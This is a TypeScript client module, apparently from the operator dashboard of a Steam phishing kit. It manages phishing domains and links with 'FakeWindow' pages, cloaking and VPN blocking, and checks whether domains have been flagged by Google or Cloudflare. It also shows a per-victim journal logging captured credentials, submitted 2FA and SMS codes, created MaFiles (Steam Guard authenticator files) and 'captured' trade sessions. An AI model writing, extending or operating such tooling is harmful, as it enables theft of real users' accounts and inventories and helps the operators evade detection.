import { readableApiError } from "./api";
import { dashboardLanguage } from "./copy";
import type {
  AuthJournalSession,
  AuthJournalTone,
  DomainBanChecks,
  DomainBindInfo,
  DomainCheckResponse,
  DomainCreatePayload,
  DomainCreateResponse,
  LinkPayload,
  SiteDetailResponse,
  SiteDomain,
  SiteLink,
  SiteStats,
  SitesApi,
  SitesListResponse,
  SiteTemplate,
} from "./sitesTypes";

type UnknownRecord = Record<string, unknown>;

function record(value: unknown): UnknownRecord {
  return value && typeof value === "object" && !Array.isArray(value)
    ? (value as UnknownRecord)
    : {};
}

function string(value: unknown, fallback = ""): string {
  return value == null ? fallback : String(value);
}

function number(value: unknown, fallback = 0): number {
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : fallback;
}

function list(value: unknown): unknown[] {
  return Array.isArray(value) ? value : [];
}

function formatJournalDate(value: unknown): string {
  const source = string(value);
  if (!source) return "—";
  const date = new Date(source);
  if (Number.isNaN(date.getTime())) return source;
  return date.toLocaleString(dashboardLanguage() === "ru" ? "ru-RU" : "en-US", {
    day: "numeric",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function formatJournalDuration(value: unknown): string {
  if (typeof value === "string" && !/^\d+(?:\.\d+)?$/.test(value.trim())) return value;
  const minutes = number(value, 0);
  if (dashboardLanguage() === "en") return minutes < 1 ? "< 1 minute" : `~ ${minutes} min`;
  if (minutes < 1) return "< 1 минуты";
  return `~ ${minutes} ${minutes === 1 ? "минута" : minutes < 5 ? "минуты" : "минут"}`;
}

const JOURNAL_ACTIONS_RU: Record<string, string> = {
  UserAuthVisit: "Пользователь открыл страницу авторизации Steam",
  CredentialsIntroduced: "Введены верные данные:",
  CredentialsChanged: "Данные изменены:",
  AccountType: "Тип аккаунта:",
  InventoryParsed: "Цена инвентаря:",
  MaFileCodeSendError: "Не удалось отправить SMS для снятия в MaFile",
  PhoneLinkedInfo: "Информация о привязанном телефоне",
  TwoFactorCodeSent: "Нужен код для входа / подтверждение с телефона",
  EmailCodeSent: "Код подтверждения отправлен на почту",
  MaFileCodeSent: "Код подтверждения MaFile отправлен",
  WizardCodeSent: "Нужно подтверждение с двухэтапки для снятия в лог",
  SmsCodeSent: "Код подтверждения отправлен по SMS",
  AuthCodeSubmitted: "Код для входа отправлен",
  WizardCodeSubmitted: "Подтверждение с двухэтапки принято",
  SmsCodeSubmitted: "Код из SMS отправлен",
  AuthSuccess: "Успешная авторизация",
  ChangeSuccess: "Данные успешно изменены",
  MaFileCreated: "MaFile успешно создан",
  TradeSessionCreated: "Успешно снята трейд-сессия",
  AccountAlreadyInDatabase: "Аккаунт уже есть в базе",
  AccountAlreadyYourInDatabase: "Аккаунт уже принадлежит вам",
};

const JOURNAL_ACTIONS_EN: Record<string, string> = {
  UserAuthVisit: "User opened the Steam authorization page",
  CredentialsIntroduced: "Valid credentials entered:",
  CredentialsChanged: "Credentials changed:",
  AccountType: "Account type:",
  InventoryParsed: "Inventory value:",
  MaFileCodeSendError: "Could not send the SMS code for MaFile",
  PhoneLinkedInfo: "Phone link information",
  TwoFactorCodeSent: "A sign-in code or phone confirmation is required",
  EmailCodeSent: "Confirmation code sent by email",
  MaFileCodeSent: "MaFile confirmation code sent",
  WizardCodeSent: "Two-factor confirmation is required",
  SmsCodeSent: "Confirmation code sent by SMS",
  AuthCodeSubmitted: "Sign-in code submitted",
  WizardCodeSubmitted: "Two-factor confirmation accepted",
  SmsCodeSubmitted: "SMS code submitted",
  AuthSuccess: "Authorization successful",
  ChangeSuccess: "Credentials changed successfully",
  MaFileCreated: "MaFile created successfully",
  TradeSessionCreated: "Trade session captured successfully",
  AccountAlreadyInDatabase: "Account is already in the database",
  AccountAlreadyYourInDatabase: "Account already belongs to you",
};

function normalizeJournalEvent(raw: unknown, sessionId: string, index: number) {
  const event = record(raw);
  const action = string(event.action);
  const data = list(event.data).map((value) => string(value)).filter(Boolean);
  const labels = dashboardLanguage() === "en" ? JOURNAL_ACTIONS_EN : JOURNAL_ACTIONS_RU;
  const text = string(event.text) || labels[action] || action || "—";
  const successful = /(?:Success|Created|Approved)$/i.test(action);
  const failed = /(?:Error|Invalid|Failed|RateLimit)/i.test(action);
  return {
    id: string(event.id, `${sessionId}-${index}`),
    text,
    tone: (successful ? "success" : failed ? "error" : "default") as AuthJournalTone,
    tag: string(event.tag) || (data.length ? data.join(":") : undefined),
    at: formatJournalDate(event.at || event.createdAt || event.created_at),
  };
}

export function normalizeAuthJournal(raw: unknown): { sessions: AuthJournalSession[] } {
  const payload = record(raw);
  const rows = Array.isArray(raw)
    ? raw
    : list(payload.sessions || payload.rows || payload.data);
  const normalized = rows.map((entry, index) => {
    const row = record(entry);
    const id = string(row.id, string(row.ip, `session-${index}`));
    const lastSeen = string(row.last_time_online || row.lastTimeOnline || row.at);
    const lastSeenTime = new Date(lastSeen).getTime();
    const events = list(row.events || row.rows).map((event, eventIndex) =>
      normalizeJournalEvent(event, id, eventIndex),
    );
    return {
      sortTime: Number.isFinite(lastSeenTime) ? lastSeenTime : 0,
      session: {
        id,
        ip: string(row.ip, "—"),
        language: string(row.language) || undefined,
        browser: string(row.browser) || undefined,
        os: string(row.os || row.platform) || undefined,
        device:
          string(row.device) ||
          (typeof row.is_desktop === "boolean"
            ? row.is_desktop
              ? "Desktop"
              : "Mobile"
            : undefined),
        duration: formatJournalDuration(row.duration ?? row.time_spent),
        at: formatJournalDate(lastSeen),
        online:
          Number.isFinite(lastSeenTime) && Date.now() - lastSeenTime <= 7 * 60 * 1000,
        events,
      } satisfies AuthJournalSession,
    };
  });
  normalized.sort((a, b) => b.sortTime - a.sortTime);
  return { sessions: normalized.map((row) => row.session) };
}

function normalizeStats(raw: unknown): SiteStats {
  const stats = record(raw);
  return {
    views: number(stats.views),
    clicks: number(stats.clicks),
    auths: number(stats.auths),
    logs: number(stats.logs),
    mafiles: number(stats.mafiles),
    desktopPercent:
      stats.desktopPercent == null ? null : number(stats.desktopPercent),
  };
}

function normalizeCountRows(raw: unknown): { name: string; count: number }[] {
  return list(raw)
    .map((entry) => {
      const row = record(entry);
      return {
        name: string(row.name || row.code),
        count: number(row.count),
      };
    })
    .filter((row) => row.name && row.count > 0);
}

function normalizeCountries(raw: unknown) {
  return list(raw)
    .map((entry) => {
      const row = record(entry);
      return {
        code: string(row.code || row.name).toUpperCase(),
        name: string(row.name) || undefined,
        count: number(row.count),
      };
    })
    .filter((row) => row.code && row.count > 0);
}

function normalizeBanChecks(raw: unknown): DomainBanChecks | undefined {
  const checks = record(raw);
  if (!Object.keys(checks).length) return undefined;
  const pick = (key: string) => {
    const row = record(checks[key]);
    if (!Object.keys(row).length) return undefined;
    return {
      banned: row.banned === true,
      clean: row.clean === true,
    };
  };
  return {
    google: pick("google"),
    cloudflare: pick("cloudflare"),
    whois: pick("whois"),
    updatedAt: string(checks.updatedAt) || undefined,
  };
}

export function normalizeDomain(raw: unknown): SiteDomain {
  const domain = record(raw);
  return {
    id: number(domain.id),
    domain: string(domain.domain),
    online: number(domain.online),
    owner: string(domain.owner) || undefined,
    isOwn: Boolean(domain.isOwn),
    isTeamPublic: Boolean(domain.isTeamPublic),
    ip: string(domain.ip) || undefined,
    service: string(domain.service) || undefined,
    status: string(domain.status) || undefined,
    isPaused: Boolean(domain.isPaused),
    createdAt: string(domain.createdAt),
    linksCount: number(domain.linksCount),
    stats: normalizeStats(domain.stats),
    ns: list(domain.ns).map((entry) => string(entry)),
    banChecks: normalizeBanChecks(domain.banChecks),
    bindType: string(domain.bindType) || undefined,
    bindNs: list(domain.bindNs).map((entry) => string(entry)),
    countries: normalizeCountries(domain.countries),
    devices: normalizeCountRows(domain.devices),
  };
}

function normalizeSteam(raw: unknown) {
  const steam = record(raw);
  if (!Object.keys(steam).length) return undefined;
  return {
    logError: steam.logError !== false,
    mafileError: Boolean(steam.mafileError),
    mafileSteamRedirect: steam.mafileSteamRedirect !== false,
    tradeError: steam.tradeError !== false,
    logRedirect: string(steam.logRedirect) || undefined,
    tradeRedirect: string(steam.tradeRedirect) || undefined,
    mafileRedirect: string(steam.mafileRedirect) || undefined,
  };
}

export function normalizeLink(raw: unknown): SiteLink {
  const link = record(raw);
  return {
    id: number(link.id),
    path: string(link.path),
    url: string(link.url) || undefined,
    link: string(link.link) || undefined,
    windowType: (string(link.windowType, "FakeWindow") ||
      "FakeWindow") as SiteLink["windowType"],
    template: link.template as string | number | undefined,
    templateName: string(link.templateName) || undefined,
    online: link.online == null ? undefined : Boolean(link.online),
    stats: normalizeStats(link.stats),
    iframe: link.iframe == null ? undefined : Boolean(link.iframe),
    cloaking: Boolean(link.cloaking),
    ban_vpn: Boolean(link.ban_vpn),
    randPath: Boolean(link.randPath),
    isPaused: Boolean(link.isPaused),
    steam: normalizeSteam(link.steam),
    countries: normalizeCountries(link.countries),
    devices: normalizeCountRows(link.devices),
  };
}

function normalizeTemplate(raw: unknown): SiteTemplate {
  const template = record(raw);
  return {
    id: number(template.id),
    name: string(template.name, `Template #${number(template.id)}`),
    preview: string(template.preview) || undefined,
    mine: template.mine == null ? undefined : Boolean(template.mine),
    isPublic: template.isPublic == null ? undefined : Boolean(template.isPublic),
  };
}

export function normalizeSitesList(raw: unknown): SitesListResponse {
  const payload = record(raw);
  return {
    domains: list(payload.domains).map(normalizeDomain),
    totalOnline: number(payload.totalOnline),
    ownCount: number(payload.ownCount),
  };
}

export function normalizeSiteDetail(raw: unknown): SiteDetailResponse {
  const payload = record(raw);
  const nested = record(payload.domain);
  const domain =
    nested.id != null || nested.domain != null
      ? normalizeDomain(nested)
      : normalizeDomain(payload);

  return {
    domain,
    links: list(payload.links).map(normalizeLink),
  };
}

function requireWorkerApi() {
  if (!window.WorkerAPI) {
    throw new Error("Worker API is unavailable");
  }
  return window.WorkerAPI;
}

export const sitesApi: SitesApi = {
  async listDomains(force = false) {
    const raw = await requireWorkerApi().get("/sites/domains", { force });
    return normalizeSitesList(raw);
  },

  async getDomain(id, force = false) {
    const raw = await requireWorkerApi().get(`/sites/domains/${id}`, { force });
    return normalizeSiteDetail(raw);
  },

  async checkDomain(domain) {
    const raw = await requireWorkerApi().post("/sites/domains/check", { domain });
    const payload = record(raw);
    return {
      existing: Boolean(payload.existing),
      message: string(payload.message) || undefined,
      ip: string(payload.ip) || undefined,
      ns: list(payload.ns).map((entry) => string(entry)).filter(Boolean),
    } satisfies DomainCheckResponse;
  },

  async getBindInfo() {
    const raw = await requireWorkerApi().get("/sites/domains/bind-info");
    const payload = record(raw);
    return {
      ip: string(payload.ip) || undefined,
      ns: list(payload.ns).map((entry) => string(entry)).filter(Boolean),
      cloudflareAvailable: Boolean(payload.cloudflareAvailable),
    } satisfies DomainBindInfo;
  },

  async createDomain(input) {
    const payloadInput: DomainCreatePayload =
      typeof input === "string" ? { domain: input } : input;
    const raw = await requireWorkerApi().post("/sites/domains", {
      domain: payloadInput.domain,
      bindType: payloadInput.bindType || "ip",
      isTransit: Boolean(payloadInput.isTransit),
    });
    const payload = record(raw);
    const created = payload.created ? normalizeDomain(payload.created) : undefined;
    return {
      existing: Boolean(payload.existing),
      created,
      bindIp: string(payload.bindIp) || undefined,
      bindNs: list(payload.bindNs).map((entry) => string(entry)).filter(Boolean),
      bindType: string(payload.bindType) || undefined,
    } satisfies DomainCreateResponse;
  },

  async deleteDomain(id) {
    return requireWorkerApi().del(`/sites/domains/${id}`);
  },

  async listTemplates(force = false) {
    const raw = await requireWorkerApi().get("/sites/templates", { force });
    const payload = record(raw);
    return list(payload.templates).map(normalizeTemplate);
  },

  async createLink(domainId, payload) {
    return requireWorkerApi().post(`/sites/domains/${domainId}/links`, payload);
  },

  async updateLink(domainId, linkId, payload) {
    return requireWorkerApi().patch(
      `/sites/domains/${domainId}/links/${linkId}`,
      payload,
    );
  },

  async deleteLink(domainId, linkId) {
    return requireWorkerApi().del(
      `/sites/domains/${domainId}/links/${linkId}`,
    );
  },

  async getLinkJournal(domainId, linkId) {
    const raw = await requireWorkerApi().get(
      `/sites/domains/${domainId}/links/${linkId}/journal`,
      { force: true },
    );
    return normalizeAuthJournal(raw);
  },
};

export function readableSitesError(error: unknown): string {
  const friendly = window.WorkerToast?.friendlyError?.(error);
  if (friendly) return friendly;
  if (error instanceof Error && error.message) return error.message;
  return readableApiError(error);
}
